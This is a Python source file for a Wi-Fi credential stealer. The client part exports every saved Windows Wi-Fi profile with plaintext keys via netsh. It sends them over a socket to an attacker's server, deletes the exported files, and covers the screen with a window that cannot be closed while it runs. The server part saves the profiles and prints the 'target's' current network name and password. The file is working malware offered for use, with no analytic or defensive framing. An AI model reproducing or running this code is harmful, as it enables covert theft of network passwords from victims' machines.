import socket
import ast
import os
import time
import socket
import subprocess
import pyautogui
import tkinter as tk
from tkinter import ttk
import threading

def countdown():
    global my_timer
    my_timer = 15

    for x in range(my_timer):
        my_timer -= 1
        time.sleep(1)

    lable = ttk.Label(root, text="Die Zeit ist um")
    lable.pack()
    root.quit()

class WlanClient:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def start(self):
        global root

        command = subprocess.check_output(["Netsh", "Wlan", "show", "interfaces"])

        str_command = str(command)
        with open("wlan.txt", "a+") as file:
            file.write(str_command)

        fhandle = open("wlan.txt")

        wlan_name_liste = []
        for line in fhandle:
            spalten = line.split(":")
            for wort in spalten:
                if "BSSID" in wort:
                    name = wort.split("\r")
                    wlan_name_liste.append(name)
        fhandle.close()
        for wlan in wlan_name_liste[0]:
            wlan = wlan.split("\\r")
            richtiges_wlan = wlan[0]

        if os.path.exists("wlan.txt"): os.remove("wlan.txt")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip, self.port))

        command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"],
                                 capture_output=True).stdout.decode()
        path = os.getcwd()

        inhalt = {}
        lst_wlan = []
        for wlan in os.listdir(path):
            if wlan.startswith("WLAN") or wlan.startswith("Wireless") and wlan.endswith(".xml"):
                lst_wlan.append(wlan)
                with open(wlan, "r+") as file:
                    full_msg = ""
                    for line in file:
                        full_msg += line

                inhalt[wlan] = full_msg

        inhalt["CURRENTWIFI"] = richtiges_wlan
        alle_wlan_namen = str(inhalt)
        s.send(alle_wlan_namen.encode())
        s.close()

        for wlan_name in lst_wlan:
            if os.path.exists(wlan_name): os.remove(wlan_name)

        countdown_thread = threading.Thread(target=countdown)
        countdown_thread.start()

        res = pyautogui.size()
        parse = str(res).split("=")
        zahl1 = parse[1].split(",")
        zahl2 = parse[2].split(")")

        x_wert, y_wert = zahl1[0], zahl2[0]
        size = f"{x_wert}x{y_wert}"

        root = tk.Tk()
        root.geometry(size)
        root.title(f"Keine Sorge dieses Programm wird in {my_timer}s geschloßen")

        root.protocol("WM_DELETE_WINDOW", 0)
        root.mainloop()

class WlanServer:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.ip, self.port))
        server.listen(5)

        print("Waiting for connection....")
        client_socket, adresse = server.accept()
        print(f"Connection with {adresse}")

        buffer = 20
        name = ""
        while True:
            msg = client_socket.recv(buffer).decode()
            if len(msg) <= 0: break
            name += msg

        str_dict = name
        inhalt = ast.literal_eval(str_dict)
        wlan_liste = []

        for wlan_name, value in inhalt.items():
            if os.path.exists(wlan_name): os.remove(wlan_name)

            if wlan_name != "CURRENTWIFI":
                wlan_liste.append(wlan_name)
                with open(wlan_name, "a+") as file:
                    file.write(value)

        current_name_space = inhalt["CURRENTWIFI"]
        current_name = current_name_space.replace(" ", "")
        check = 0
        for wlan in wlan_liste:
            if current_name in wlan:
                with open(wlan, "r+") as file:
                    for line in file:
                        if "keyMaterial" in line:
                            teilen = line.split(">")
                            lst_passwort = teilen[1].split("<")
                            current_password = lst_passwort[0]
                            check += 1

        print("\nConnection has been established")
        print(f"{len(wlan_liste)} Wifi files have been saved to your directory")
        if check >= 1: print(f"The current WI-FI and Passwort of the target is \n\nWI-FI: {current_name}\nPassword: {current_password}")
        else: print(f"The current WI-FI of the targe is \n\nWI-FI: {current_name}\nThe password couldn't be detected")
